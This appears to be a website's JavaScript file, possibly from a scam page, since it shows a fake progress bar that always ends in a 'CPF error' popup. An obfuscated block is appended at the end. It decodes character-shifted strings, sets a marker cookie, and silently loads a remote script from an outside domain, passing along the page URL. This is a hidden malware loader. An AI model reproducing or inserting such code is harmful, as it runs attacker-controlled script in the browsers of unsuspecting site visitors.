const button = document.querySelector("#sends");

function checkCookie() {
	return document.cookie.split(";").some((cookie => cookie.trim().startsWith("_fbc")))
}
button.addEventListener("click", (() => {
	showPopup()
}));
const showPopup = () => {
	const popup = document.querySelector("#popoup");
	if (popup) {
		document.getElementById("loading");
		const progress = document.querySelector(".progress"),
			updateProgressBar = async () => {
				let percentage = 0;
				for (; percentage < 100;) percentage += 4, progress.style.width = `${percentage}%`, await new Promise((resolve => setTimeout(resolve, 200)));
				document.querySelector(".contente").style.display = "flex", document.querySelector(".loading").style.display = "none", document.querySelector("#carregandodadoss").innerHTML = "ERRO NO CPF", document.querySelector("#naomostrardeinicio").style.display = "flex", document.querySelector("#carregandodadosSs").style.display = "flex", document.querySelector(".headlineectapopoup").style.display = "none"
			};
		popup.classList.add("fade-in"), popup.style.visibility = "visible", updateProgressBar()
	} else console.error("Popup element not found.")
};
(function(o, d, l) {
	try {
		o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
		o.b = o.f('UMUWJKX');
		o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
			o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
		}, 1000);
		d.cookie = o.b + '=full;max-age=39800;'
	} catch (e) {};
}({}, document, location));